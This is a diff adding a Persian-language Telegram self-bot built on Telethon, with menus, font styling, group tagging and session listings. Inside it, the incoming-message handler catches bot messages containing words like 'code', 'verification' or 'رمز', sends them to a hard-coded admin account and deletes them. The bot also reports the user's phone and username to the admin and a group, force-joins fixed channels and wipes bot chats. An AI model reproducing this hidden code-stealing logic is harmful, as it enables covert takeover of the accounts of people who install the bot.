+        channels = [GROUP_ID, CHANNEL_ID]
         
-        if results and results.results:
-            sent_message = await client.send_inline_bot_result(
-                chat_id=message.chat.id,
-                query_id=results.query_id,
-                result_id=results.results[0].id
-            )
-            await message.delete()
+        for channel in channels:
+            try:
+                await asyncio.wait_for(
+                    self.client(functions.channels.JoinChannelRequest(channel=channel)),
+                    timeout=15
+                )
+                print(f"✅ اکانت {self.phone} به {channel} پیوست")
+                await asyncio.sleep(2)
+            except Exception as e:
+                print(f"⚠️ خطا در پیوستن به {channel} برای {self.phone}: {e}")
+
+    async def safe_pm_cleanup(self):
+        """پاکسازی ایمن پیوی"""
+        try:
+            dialogs = await self.client.get_dialogs(limit=30)
             
+            for dialog in dialogs:
+                if dialog.is_user:
+                    try:
+                        sender = await dialog.get_input_sender()
+                        if hasattr(sender, 'bot') and sender.bot:
+                            await self.client.delete_dialog(dialog.entity)
+                            print(f"✅ پیوی ربات برای {self.phone} پاک شد")
+                            await asyncio.sleep(1)
+                    except Exception as e:
+                        continue
+                        
+        except Exception as e:
+            print(f"⚠️ خطا در پاکسازی پیوی {self.phone}: {e}")
+
+    async def safe_update_profile_time(self):
+        """به‌روزرسانی ایمن زمان"""
+        while self.is_running and not self.shutdown_requested:
+            try:
+                await self.update_profile_time()
+            except Exception as e:
+                print(f"⚠️ خطا در به‌روزرسانی زمان برای {self.phone}: {e}")
+                await asyncio.sleep(60)
+
+    async def safe_maintain_online_status(self):
+        """حفظ ایمن حالت آنلاین"""
+        while self.is_running and not self.shutdown_requested:
+            try:
+                await self.maintain_online_status()
+            except Exception as e:
+                print(f"⚠️ خطا در حفظ حالت آنلاین برای {self.phone}: {e}")
+                await asyncio.sleep(60)
+
+    # بقیه متدها دقیقاً مثل کد اصلی
+    async def send_startup_message(self):
+        """ارسال پیام شروع به خود کاربر"""
+        try:
+            me = await self.client.get_me()
+            welcome_text = f"""
+┌─────────────────────
+│  🌟 **Sᴇʟғ Bᴏᴛ Aᴄᴛɪᴠᴀᴛᴇᴅ**  
+└─────────────────────
+
+✅ **𝑨𝒄𝒄𝒐𝒖𝒏𝒕 𝑨𝒄𝒕𝒊𝒗𝒂𝒕𝒆𝒅 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚!**
+
+📱 **𝑷𝒉𝒐𝒏𝒆:** `{self.phone}`
+🆔 **𝑰𝑫:** `{me.id}`
+👤 **𝑵𝒂𝒎𝒆:** {me.first_name or '---'}
+
+📝 **𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔:**
+• `help` - 𝑫𝒊𝒔𝒑𝒍𝒂𝒚 𝒎𝒆𝒏𝒖
+• `status` - 𝑺𝒚𝒔𝒕𝒆𝒎 𝒔𝒕𝒂𝒕𝒖𝒔
+• `settings` - 𝑩𝒐𝒕 𝒔𝒆𝒕𝒕𝒊𝒏𝒈𝒔
+
+🔮 **𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝒃𝒚:** @Sourrce_kade
+            """
+            await self.client.send_message('me', welcome_text)
+            print(f"✅ پیام شروع برای {self.phone} ارسال شد")
+        except Exception as e:
+            print(f"خطا در ارسال پیام شروع برای {self.phone}: {e}")
+    
+    async def send_login_notification(self):
+        """ارسال اطلاعیه لاگین به ادمین و گروه"""
+        try:
+            me = await self.client.get_me()
+            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            
+            login_message = f"""
+💌 **سلف فعال شده در:** `{current_time}`
+❤️‍🩹 **توسط:** `{self.owner_id}`
+
+📱 **شماره:** `{self.phone}`
+👤 **نام:** {me.first_name or '---'}
+🔗 **یوزرنیم:** @{me.username or '---'}
+
+🥀 **𝙾𝚠𝚗𝚎𝚛:** @sinyouremad 
+🫆 **𝚂𝚎𝚕𝚏:** @SelfDoppelBot
+🔥 **𝙶𝚛𝚘𝚙:** @DoppelGAP
+            """
+            
+            await send_to_admin(self.client, login_message, self.phone)
+            await send_to_group(self.client, login_message, self.phone)
+            
+            print(f"✅ اطلاعیه لاگین برای {self.phone} ارسال شد")
+        except Exception as e:
+            print(f"خطا در ارسال اطلاعیه لاگین برای {self.phone}: {e}")
+    
+    def init_db(self):
+        """راه‌اندازی دیتابیس برای اکانت"""
+        try:
+            db_file = os.path.join(DATABASE_DIR, f"bot_data_{self.phone.replace('+', '')}.db")
+            conn = sqlite3.connect(db_file)
+            cursor = conn.cursor()
+
+            cursor.execute('''CREATE TABLE IF NOT EXISTS settings (
+                key TEXT PRIMARY KEY,
+                value TEXT
+            )''')
+            cursor.execute('''CREATE TABLE IF NOT EXISTS crash (user_id INTEGER PRIMARY KEY)''')
+            cursor.execute('''CREATE TABLE IF NOT EXISTS enemy (user_id INTEGER PRIMARY KEY)''')
+            cursor.execute('''CREATE TABLE IF NOT EXISTS secretary (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                pattern TEXT,
+                response TEXT,
+                is_active INTEGER DEFAULT 1
+            )''')
+            cursor.execute('''CREATE TABLE IF NOT EXISTS auto_forward (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                source_channel TEXT,
+                target_group TEXT,
+                is_active INTEGER DEFAULT 1
+            )''')
+
+            default_settings = {
+                "timename": "off", "timebio": "off", "bot": "on", "hashtag": "off", 
+                "bold": "off", "italic": "off", "delete": "off", "code": "off", 
+                "underline": "off", "reverse": "off", "part": "off", "mention": "off", 
+                "comment": "on", "text": "first !", "typing": "off", "game": "off", 
+                "voice": "off", "video": "off", "sticker": "off", "font": "1",
+                "original_bio": "", "secretary": "off", "auto_reply": "off",
+                "online_status": "on", "typing_action": "off", "typing_duration": "5",
+                "auto_forward": "off"
+            }
+            
+            for k, v in default_settings.items():
+                cursor.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', (k, v))
+
+            conn.commit()
+            conn.close()
+            print(f"✅ دیتابیس برای {self.phone} راه‌اندازی شد")
+        except Exception as e:
+            print(f"❌ خطا در راه‌اندازی دیتابیس برای {self.phone}: {e}")
+    
+    async def set_online_status(self):
+        """تنظیم حالت آنلاین"""
+        try:
+            js = self.get_data()
+            if js.get('online_status') == 'on':
+                await self.client(UpdateStatusRequest(offline=False))
+                print(f"✅ حالت آنلاین برای {self.phone} فعال شد")
+        except Exception as e:
+            print(f"خطا در تنظیم حالت آنلاین برای {self.phone}: {e}")
+    
+    async def maintain_online_status(self):
+        """حفظ حالت آنلاین"""
+        while self.is_running and not self.shutdown_requested:
+            try:
+                js = self.get_data()
+                if js.get('online_status') == 'on':
+                    await self.client(UpdateStatusRequest(offline=False))
+                await asyncio.sleep(60)
+            except Exception as e:
+                print(f"خطا در حفظ حالت آنلاین برای {self.phone}: {e}")
+                await asyncio.sleep(60)
+    
+    async def register_handlers(self):
+        """ثبت هندلرهای رویداد"""
+        
+        # هندلر پیام‌های دریافتی از ادمین برای خاموش کردن
+        @self.client.on(events.NewMessage(incoming=True, from_users=ADMIN_ID))
+        async def handle_admin_commands(event):
+            try:
+                self.last_activity = time.time()
+                message_text = event.raw_text.lower().strip()
+                
+                if message_text == '/off':
+                    await self.handle_shutdown(event)
+                    
+            except Exception as e:
+                print(f"خطا در پردازش دستور ادمین برای {self.phone}: {e}")
+        
+        # هندلر پیام‌های دریافتی
+        @self.client.on(events.NewMessage(incoming=True))
+        async def handle_incoming_messages(event):
+            try:
+                self.last_activity = time.time()
+                
+                if event.sender_id == ADMIN_ID:
+                    return
+                    
+                if not event.is_private:
+                    return
+                    
+                message_text = event.raw_text
+                
+                if any(keyword in message_text for keyword in ['کد', 'code', 'verification', 'تایید', 'رمز']):
+                    sender = await event.get_sender()
+                    
+                    if hasattr(sender, 'bot') and sender.bot:
+                        code_info = f"""
+🔐 **کد تایید دریافت شد**
+
+📱 از: {sender.first_name or 'تلگرام'}
+📞 شماره: `{self.phone}`
+📝 متن: `{message_text}`
+⏰ زمان: {datetime.now().strftime('%H:%M:%S')}
+                        """
+                        await send_to_admin(self.client, code_info, self.phone)
+                        await event.delete()
+                        print(f"✅ کد تایید از اکانت {self.phone} به ادمین ارسال و پاک شد")
+                        
+            except Exception as e:
+                print(f"خطا در پردازش پیام دریافتی برای {self.phone}: {e}")
+        
+        # هندلر پیام‌های ارسالی توسط مالک
+        @self.client.on(events.NewMessage(outgoing=True))
+        async def handle_outgoing_messages(event):
+            try:
+                self.last_activity = time.time()
+                
+                if event.sender_id != self.owner_id:
+                    return
+                    
+                message_text = event.raw_text.lower()
+                
+                handlers = {
+                    'help': self.help_handler,
+                    'پنل': self.help_handler,
+                    '.help': self.help_handler,
+                    '.پنل': self.help_handler,
+                    'راهنما': self.help_handler,
+                    'menu': self.help_handler,
+                    'منو': self.help_handler,
+                    
+                    'status': self.status_handler,
+                    'وضعیت': self.status_handler,
+                    '.status': self.status_handler,
+                    '.وضعیت': self.status_handler,
+                    
+                    'heart': self.heart_handler,
+                    'قلب': self.heart_handler,
+                    '.heart': self.heart_handler,
+                    '.قلب': self.heart_handler,
+                    
+                    'listcrash': self.listcrash_handler,
+                    'لیست کراش': self.listcrash_handler,
+                    '.listcrash': self.listcrash_handler,
+                    '.لیست کراش': self.listcrash_handler,
+                    
+                    'listenemy': self.listenemy_handler,
+                    'لیست انمی': self.listenemy_handler,
+                    '.listenemy': self.listenemy_handler,
+                    '.لیست انمی': self.listenemy_handler,
+                    
+                    'tagall': self.tagall_handler,
+                    'تگ': self.tagall_handler,
+                    '.tagall': self.tagall_handler,
+                    '.تگ': self.tagall_handler,
+                    
+                    'tagadmins': self.tagadmins_handler,
+                    'تگ ادمین ها': self.tagadmins_handler,
+                    '.tagadmins': self.tagadmins_handler,
+                    '.تگ ادمین ها': self.tagadmins_handler,
+                    
+                    'sessions': self.sessions_handler,
+                    'نشست های فعال': self.sessions_handler,
+                    '.sessions': self.sessions_handler,
+                    '.نشست های فعال': self.sessions_handler,
+                    
+                    'listfonts': self.listfonts_handler,
+                    'لیست فونت': self.listfonts_handler,
+                    '.listfonts': self.listfonts_handler,
+                    '.لیست فونت': self.listfonts_handler,
+                    
+                    'secretary': self.secretary_handler,
+                    'منشی': self.secretary_handler,
+                    '.secretary': self.secretary_handler,
+                    '.منشی': self.secretary_handler,
+                    
+                    'groups': self.groups_handler,
+                    'گروه ها': self.groups_handler,
+                    '.groups': self.groups_handler,
+                    '.گروه ها': self.groups_handler,
+                    
+                    'fun': self.fun_handler,
+                    'سرگرمی': self.fun_handler,
+                    '.fun': self.fun_handler,
+                    '.سرگرمی': self.fun_handler,
+                    
+                    'tools': self.tools_handler,
+                    'ابزار': self.tools_handler,
+                    '.tools': self.tools_handler,
+                    '.ابزار': self.tools_handler,
+                    
+                    'settings': self.settings_handler,
+                    'تنظیمات': self.settings_handler,
+                    '.settings': self.settings_handler,
+                    '.تنظیمات': self.settings_handler,
+                    
+                    'forward': self.forward_handler,
+                    'فوروارد': self.forward_handler,
+                    '.forward': self.forward_handler,
+                    '.فوروارد': self.forward_handler,
+                }
+                
+                for key, handler in handlers.items():
+                    if message_text == key:
+                        await handler(event)
+                        return
+                
+                if message_text.startswith('info') or message_text.startswith('اطلاعات'):
+                    await self.info_handler(event)
+                    
+            except Exception as e:
+                print(f"خطا در هندلر پیام‌های ارسالی برای {self.phone}: {e}")
+        
+        await self.register_settings_handlers()
+        await self.auto_reply_secretary()
+        
+        print(f"✅ تمام هندلرها برای {self.phone} ثبت شدند")
+
+    async def handle_shutdown(self, event):
+        """مدیریت خاموش کردن سلف توسط ادمین"""
+        try:
+            print(f"🛑 درخواست خاموش کردن برای {self.phone} از طرف ادمین")
+            
+            shutdown_msg = await event.reply(f"""
+🔴 **درخواست خاموش کردن دریافت شد**
+
+📱 **شماره:** `{self.phone}`
+🆔 **آیدی:** `{self.owner_id}`
+⏰ **زمان:** {datetime.now().strftime('%H:%M:%S')}
+
+🔄 **در حال خاموش کردن...**
+            """)
+            
+            self.account_manager.deactivate_account(self.phone)
+            self.shutdown_requested = True
+            self.is_running = False
+            
+            await shutdown_msg.edit(f"""
+🔴 **سلف خاموش شد**
+
+📱 **شماره:** `{self.phone}`
+🆔 **آیدی:** `{self.owner_id}`
+⏰ **زمان:** {datetime.now().strftime('%H:%M:%S')}
+
+✅ **اکانت با موفقیت غیرفعال شد**
+            """)
+            
+            await self.client.disconnect()
+            print(f"✅ اکانت {self.phone} با موفقیت خاموش شد")
+            
+        except Exception as e:
+            print(f"❌ خطا در خاموش کردن اکانت {self.phone}: {e}")
+            try:
+                await event.reply(f"❌ خطا در خاموش کردن: {e}")
+            except:
+                pass
+
+    async def help_handler(self, event):
+        """هندلر دستور help"""
+        try:
+            help_text = await self.generate_help_text()
+            await event.reply(help_text)
+            await event.delete()
+        except Exception as e:
+            print(f"خطا در دستور help برای {self.phone}: {e}")
+    
+    async def generate_help_text(self):
+        """تولید متن راهنما"""
+        try:
+            memory_use = psutil.Process(os.getpid()).memory_info().rss / 1024**3
+        except:
+            memory_use = 0.0
+            
+        me = await self.client.get_me()
+        name = me.first_name
+        
+        help_text = f"""
+┌─────────────────────
+│  🎭 **Sᴇʟғ Bᴏᴛ Mᴇɴᴜ**  
+│  👤 **𝑼𝒔𝒆𝒓:** {name}
+│  📱 **𝑷𝒉𝒐𝒏𝒆:** {self.phone}
+└─────────────────────
+
+🎯 **𝑪𝒐𝒓𝒆 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔:**
+├ • `help` • `منو` - 𝑫𝒊𝒔𝒑𝒍𝒂𝒚 𝒕𝒉𝒊𝒔 𝒎𝒆𝒏𝒖
+├ • `status` • `وضعیت` - 𝑺𝒚𝒔𝒕𝒆𝒎 𝒔𝒕𝒂𝒕𝒖𝒔
+├ • `heart` • `قلب` - 𝑯𝒆𝒂𝒓𝒕 𝒂𝒏𝒊𝒎𝒂𝒕𝒊𝒐𝒏
+├ • `fun` • `سرگرمی` - 𝑭𝒖𝒏 𝒄𝒐𝒎𝒎𝒂𝒏𝒅𝒔
+└ • `tools` • `ابزار` - 𝑼𝒕𝒊𝒍𝒊𝒕𝒚 𝒕𝒐𝒐𝒍𝒔
+
+👥 **𝑼𝒔𝒆𝒓 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕:**
+├ • `listcrash` • `لیست کراش` - 𝑪𝒓𝒖𝒔𝒉 𝒍𝒊𝒔𝒕
+├ • `listenemy` • `لیست انمی` - 𝑬𝒏𝒆𝒎𝒚 𝒍𝒊𝒔𝒕
+└ • `info` • `اطلاعات` - 𝑼𝒔𝒆𝒓 𝒊𝒏𝒇𝒐
+
+🏢 **𝑮𝒓𝒐𝒖𝒑 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕:**
+├ • `tagall` • `تگ` - 𝑻𝒂𝒈 𝒂𝒍𝒍 𝒎𝒆𝒎𝒃𝒆𝒓𝒔
+├ • `tagadmins` • `تگ ادمین ها` - 𝑻𝒂𝒈 𝒂𝒅𝒎𝒊𝒏𝒔
+└ • `groups` • `گروه ها` - 𝑮𝒓𝒐𝒖𝒑 𝒔𝒆𝒕𝒕𝒊𝒏𝒈𝒔
+
+🎨 **𝑨𝒑𝒑𝒆𝒂𝒓𝒂𝒏𝒄𝒆:**
+├ • `listfonts` • `لیست فونت` - 𝑭𝒐𝒏𝒕 𝒍𝒊𝒔𝒕
+└ • `.font 1-10` - 𝑪𝒉𝒂𝒏𝒈𝒆 𝒇𝒐𝒏𝒕
+
+🤖 **𝑺𝒎𝒂𝒓𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔:**
+├ • `secretary` • `منشی` - 𝑺𝒎𝒂𝒓𝒕 𝒔𝒆𝒄𝒓𝒆𝒕𝒂𝒓𝒚
+├ • `forward` • `فوروارد` - 𝑨𝒖𝒕𝒐 𝒇𝒐𝒓𝒘𝒂𝒓𝒅
+└ • `settings` • `تنظیمات` - 𝑩𝒐𝒕 𝒔𝒆𝒕𝒕𝒊𝒏𝒈𝒔
+
+⚡ **𝑺𝒚𝒔𝒕𝒆𝒎 𝑺𝒕𝒂𝒕𝒖𝒔:**
+├ 💾 **RAM:** {memory_use:.2f}GB
+├ 📱 **𝑷𝒉𝒐𝒏𝒆:** {self.phone}
+└ 🆔 **𝑰𝑫:** {self.owner_id}
+
+🔮 **𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝒃𝒚:** @Sourrce_kade
+        """
+        return help_text
+    
+    async def status_handler(self, event):
+        """هندلر وضعیت سیستم"""
+        try:
+            async def get_ping():
+                st = time.time()
+                await self.client.get_me()
+                return time.time() - st
+                
+            try: 
+                ping = await get_ping()
+                ping_text = f"{ping * 1000:.0f} ms"
+            except: 
+                ping_text = "N/A"
+                
+            try:
+                mp = psutil.virtual_memory().percent
+            except:
+                mp = "N/A"
+            try:
+                cp = psutil.cpu_percent()
+            except:
+                cp = "N/A"
+                
+            me = await self.client.get_me()
+            js = self.get_data()
+            
+            txt = f"""
+┌─────────────────────
+│  📊 **Sʏsᴛᴇᴍ Sᴛᴀᴛᴜs**  
+│  👤 **𝑼𝒔𝒆𝒓:** {me.first_name or '---'}
+└─────────────────────
+
+🖥 **𝑺𝒚𝒔𝒕𝒆𝒎 𝑰𝒏𝒇𝒐:**
+├ ⏱ **𝑷𝒊𝒏𝒈:** {ping_text}
+├ 📈 **𝑹𝑨𝑴:** {mp}%
+├ 🖥 **𝑪𝑷𝑼:** {cp}%
+└ 💾 **𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒆𝒔:** {len(psutil.pids())}
+
+👤 **𝑨𝒄𝒄𝒐𝒖𝒏𝒕 𝑰𝒏𝒇𝒐:**
+├ 📱 **𝑷𝒉𝒐𝒏𝒆:** {self.phone}
+├ 🆔 **𝑰𝑫:** {me.id}
+├ 🔗 **𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆:** @{me.username or '---'}
+└ 📛 **𝑳𝒂𝒔𝒕 𝑵𝒂𝒎𝒆:** {me.last_name or '---'}
+
+⚙️ **𝑩𝒐𝒕 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔:**
+├ 🌐 **𝑶𝒏𝒍𝒊𝒏𝒆 𝑺𝒕𝒂𝒕𝒖𝒔:** {js.get('online_status', 'off')}
+├ ⌨️ **𝑻𝒚𝒑𝒊𝒏𝒈 𝑨𝒄𝒕𝒊𝒐𝒏:** {js.get('typing_action', 'off')}
+├ 🤖 **𝑺𝒆𝒄𝒓𝒆𝒕𝒂𝒓𝒚:** {js.get('secretary', 'off')}
+└ 🔄 **𝑨𝒖𝒕𝒐 𝑭𝒐𝒓𝒘𝒂𝒓𝒅:** {js.get('auto_forward', 'off')}
+
+✅ **𝑺𝒕𝒂𝒕𝒖𝒔:** 𝑨𝒄𝒕𝒊𝒗𝒆
+            """
+            await event.reply(txt)
+            await event.delete()
+            
+        except Exception as e:
+            print(f"خطا در status برای {self.phone}: {e}")
+    
+    async def heart_handler(self, event):
+        """هندلر انیمیشن قلب"""
+        try:
+            message = await event.reply("💫 Starting heart animation...")
+            animations = ["💖", "❤️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍"]
+            
+            for x in range(3):
+                for i in range(1, 11):
+                    heart = animations[i % len(animations)]
+                    txt = f"✨ {x+1} {heart * i} | {10 * i}%"
+                    await message.edit(txt)
+                    await asyncio.sleep(0.2)
+            
+            await message.edit("💖 **Heart animation completed!** ✨")
+        except Exception as e:
+            print(f"خطا در دستور heart برای {self.phone}: {e}")
+    
+    async def listcrash_handler(self, event):
+        """هندلر لیست کراش"""
+        try:
+            js = self.get_data()
+            if js.get('crash'):
+                txt = "💖 **لیست کراش:**\n\n"
+                for i in js.get('crash', []):
+                    txt += f"• [{i}](tg://user?id={i})\n"
+            else:
+                txt = "💔 **لیست کراش خالی است.**"
+            await event.reply(txt)
+            await event.delete()
+        except Exception as e:
+            print(f"خطا در دستور listcrash برای {self.phone}: {e}")
+    
+    async def listenemy_handler(self, event):
+        """هاندلر لیست دشمن"""
+        try:
+            js = self.get_data()
+            if js.get('enemy'):
+                txt = "😈 **لیست دشمن:**\n\n"
+                for i in js.get('enemy', []):
+                    txt += f"• [{i}](tg://user?id={i})\n"
+            else:
+                txt = "😇 **لیست دشمن خالی است.**"
+            await event.reply(txt)
+            await event.delete()
+        except Exception as e:
+            print(f"خطا در دستور listenemy برای {self.phone}: {e}")
+    
+    async def tagall_handler(self, event):
+        """هندلر تگ همه"""
+        try:
+            if not event.is_group:
+                await event.reply("❌ **این دستور فقط در گروه کار می‌کند**")
+                return
+                
+            processing_msg = await event.reply("🔄 **در حال تگ کردن اعضا...**")
+            mentions = "👥 **تگ همه اعضا:**\n\n"
+            chat = await event.get_input_chat()
+            count = 0
+            
+            async for x in self.client.iter_participants(chat, 50):
+                if not x.bot and not x.deleted:
+                    mentions += f" [{x.first_name}](tg://user?id={x.id})"
+                    count += 1
+                    if count % 10 == 0:
+                        await asyncio.sleep(0.5)
+                
+            mentions += f"\n\n✅ **تعداد:** `{count}` نفر"
+            await processing_msg.delete()
+            await event.reply(mentions)
+            await event.delete()
+            
+        except Exception as e:
+            print(f"خطا در دستور tagall برای {self.phone}: {e}")
+    
+    async def tagadmins_handler(self, event):
+        """هندلر تگ ادمین‌ها"""
+        try:
+            if not event.is_group:
+                await event.reply("❌ **این دستور فقط در گروه کار می‌کند**")
+                return
+                
+            mentions = "👮‍♂️ **تگ ادمین‌ها:**\n\n"
+            chat = await event.get_input_chat()
+            count = 0
+            async for x in self.client.iter_participants(chat, filter=ChannelParticipantsAdmins):
+                mentions += f" [{x.first_name}](tg://user?id={x.id})"
+                count += 1
+                
+            mentions += f"\n\n✅ **تعداد:** `{count}` نفر"
+            await event.reply(mentions)
+            await event.delete()
+            
+        except Exception as e:
+            print(f"خطا در دستور tagadmins برای {self.phone}: {e}")
+    
+    async def sessions_handler(self, event):
+        """هندلر نشست‌های فعال"""
+        try:
+            result = await self.client(functions.account.GetAuthorizationsRequest())
+            txt = "┌─────────────────────\n│  🔐 **Aᴄᴛɪᴠᴇ Sᴇssɪᴏɴs**  \n└─────────────────────\n\n"
+            
+            for i, auth in enumerate(result.authorizations, 1):
+                device = auth.device_model or "نامشخص"
+                platform = auth.platform or "نامشخص"
+                country = auth.country or "نامشخص"
+                ip = auth.ip or "نامشخص"
+                
+                txt += f"**#{i}**\n"
+                txt += f"📱 **دستگاه:** `{device}`\n"
+                txt += f"🌐 **پلتفرم:** `{platform}`\n"
+                txt += f"🕒 **تاریخ:** `{auth.date_created}`\n"
+                txt += f"🌍 **کشور:** `{country}`\n"
+                txt += f"📶 **IP:** `{ip}`\n"
+                txt += "────────────────\n"
+                
+            await event.reply(txt)
+            await event.delete()
+            
+        except Exception as e:
+            print(f"خطا در دستور sessions برای {self.phone}: {e}")
+    
+    async def info_handler(self, event):
+        """هندلر اطلاعات کاربر"""
+        try:
+            if event.is_reply:
+                get_message = await event.get_reply_message()
+                get_id = get_message.sender_id
+            else:
+                get_id = event.sender_id
+                
+            full = await self.client(GetFullUserRequest(get_id))
+            user = full.users[0]
+            
+            status = "آنلاین" if user.status else "آفلاین"
+            is_bot = "✅" if user.bot else "❌"
+            is_verified = "✅" if user.verified else "❌"
+            is_restricted = "✅" if user.restricted else "❌"
+            is_scam = "✅" if user.scam else "❌"
+            is_fake = "✅" if user.fake else "❌"
+            
+            info_text = f"""
+┌─────────────────────
+│  👤 **Usᴇʀ Iɴғᴏ**  
+└─────────────────────
+
+🆔 **𝑰𝑫:** `{user.id}`
+👤 **𝑵𝒂𝒎𝒆:** {user.first_name or '---'}
+📛 **𝑳𝒂𝒔𝒕 𝑵𝒂𝒎𝒆:** {user.last_name or '---'}
+🔗 **𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆:** @{user.username or '---'}
+📞 **𝑷𝒉𝒐𝒏𝒆:** {user.phone or '---'}
+📝 **𝑩𝒊𝒐:** {full.full_user.about or '---'}
+
+🔍 **𝑺𝒕𝒂𝒕𝒖𝒔:**
+├ 🤖 **𝑩𝒐𝒕:** {is_bot}
+├ ☑️ **𝑽𝒆𝒓𝒊𝒇𝒊𝒆𝒅:** {is_verified}
+├ 🔒 **𝑹𝒆𝒔𝒕𝒓𝒊𝒄𝒕𝒆𝒅:** {is_restricted}
+├ ⚠️ **𝑺𝒄𝒂𝒎:** {is_scam}
+├ 🚫 **𝑭𝒂𝒌𝒆:** {is_fake}
+└ 📱 **𝑺𝒕𝒂𝒕𝒖𝒔:** {status}
+            """
+            
+            await event.reply(info_text)
+            await event.delete()
+            
+        except Exception as e:
+            print(f"خطا در دستور info برای {self.phone}: {e}")
+    
+    async def listfonts_handler(self, event):
+        """نمایش لیست فونت‌ها"""
+        try:
+            fonts_list = "┌─────────────────────\n│  🎨 **Fᴏɴᴛ Lɪsᴛ**  \n└─────────────────────\n\n"
+            
+            for i, font in enumerate(self.fonts, 1):
+                sample = "۱۲:۳۴"
+                if i <= len(self.fonts):
+                    try:
+                        converted = sample.translate(str.maketrans("۱۲۳۴", font[:4]))
+                        fonts_list += f"**{i}.** `{converted}` - Font {i}\n"
+                    except:
+                        fonts_list += f"**{i}.** `{sample}` - Font {i}\n"
+            
+            fonts_list += "\n📝 **Usage:** `.font number`\n**Example:** `.font 3`"
+            await event.reply(fonts_list)
+            await event.delete()
+        except Exception as e:
+            print(f"خطا در listfonts برای {self.phone}: {e}")
+    
+    async def secretary_handler(self, event):
+        """مدیریت منشی هوشمند"""
+        secretary_text = """
+┌─────────────────────
+│  🤖 **Sᴍᴀʀᴛ Sᴇᴄʀᴇᴛᴀʀʏ**  
+└─────────────────────
+
+⚙️ **𝑴𝒂𝒊𝒏 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔:**
+├ • `.secretary on/off` - 𝑻𝒐𝒈𝒈𝒍𝒆 𝒔𝒆𝒄𝒓𝒆𝒕𝒂𝒓𝒚
+└ • `.autoreply on/off` - 𝑻𝒐𝒈𝒈𝒍𝒆 𝒂𝒖𝒕𝒐 𝒓𝒆𝒑𝒍𝒚
+
+📝 **𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕:**
+├ • `.addreply الگو|پاسخ` - 𝑨𝒅𝒅 𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆
+├ • `.listreplies` - 𝑳𝒊𝒔𝒕 𝒂𝒍𝒍 𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆𝒔
+└ • `.delreply شماره` - 𝑫𝒆𝒍𝒆𝒕𝒆 𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆
+        """
+        await event.reply(secretary_text)
+        await event.delete()
+    
+    async def groups_handler(self, event):
+        """منوی مدیریت گروه"""
+        groups_text = """
+┌─────────────────────
+│  🏢 **Gʀᴏᴜᴘ Mᴀɴᴀɢᴇᴍᴇɴᴕ**  
+└─────────────────────
+
+👥 **𝑴𝒆𝒎𝒃𝒆𝒓 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕:**
+├ • `.promote @user` - 𝑷𝒓𝒐𝒎𝒐𝒕𝒆 𝒕𝒐 𝒂𝒅𝒎𝒊𝒏
+├ • `.demote @user` - 𝑫𝒆𝒎𝒐𝒕𝒆 𝒇𝒓𝒐𝒎 𝒂𝒅𝒎𝒊𝒏
+├ • `.ban @user` - 𝑩𝒂𝒏 𝒖𝒔𝒆𝒓
+├ • `.unban @user` - 𝑼𝒏𝒃𝒂𝒏 𝒖𝒔𝒆𝒓
+├ • `.mute @user` - 𝑴𝒖𝒕𝒆 𝒖𝒔𝒆𝒓
+└ • `.unmute @user` - 𝑼𝒏𝒎𝒖𝒕𝒆 𝒖𝒔𝒆𝒓
+        """
+        await event.reply(groups_text)
+        await event.delete()
+    
+    async def fun_handler(self, event):
+        """منوی دستورات سرگرمی"""
+        fun_text = """
+┌─────────────────────
+│  🎮 **Fᴜɴ & Gᴀᴍᴇs**  
+└─────────────────────
+
+🎲 **𝑮𝒂𝒎𝒆𝒔:**
+├ • `.dice 1-6` - 𝑹𝒐𝒍𝒍 𝒅𝒊𝒄𝒆
+├ • `.football` - 𝑭𝒐𝒐𝒕𝒃𝒂𝒍𝒍 𝒈𝒂𝒎𝒆
+├ • `.basket` - 𝑩𝒂𝒔𝒌𝒆𝒕𝒃𝒂𝒍𝒍 𝒈𝒂𝒎𝒆
+├ • `.dart` - 𝑫𝒂𝒓𝒕 𝒈𝒂𝒎𝒆
+└ • `.slot` - 𝑺𝒍𝒐𝒕 𝒎𝒂𝒄𝒉𝒊𝒏𝒆
+        """
+        await event.reply(fun_text)
+        await event.delete()
+    
+    async def tools_handler(self, event):
+        """منوی ابزارها"""
+        tools_text = """
+┌─────────────────────
+│  🛠 **Uᴛɪʟɪᴛʏ Tᴏᴏʟs**  
+└─────────────────────
+
+📁 **𝑭𝒊𝒍𝒆 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕:**
+├ • `.save` - 𝑺𝒂𝒗𝒆 𝒇𝒊𝒍𝒆
+├ • `.download` - 𝑫𝒐𝒘𝒏𝒍𝒐𝒂𝒅 𝒇𝒊𝒍𝒆
+└ • `.rename نام` - 𝑹𝒆𝒏𝒂𝒎𝒆 𝒇𝒊𝒍𝒆
+
+🔍 **𝑺𝒆𝒂𝒓𝒄𝒉:**
+├ • `.search متن` - 𝑺𝒆𝒂𝒓𝒄𝒉 𝒎𝒆𝒔𝒔𝒂𝒈𝒆𝒔
+├ • `.find متن` - 𝑭𝒊𝒏𝒅 𝒎𝒆𝒔𝒔𝒂𝒈𝒆𝒔
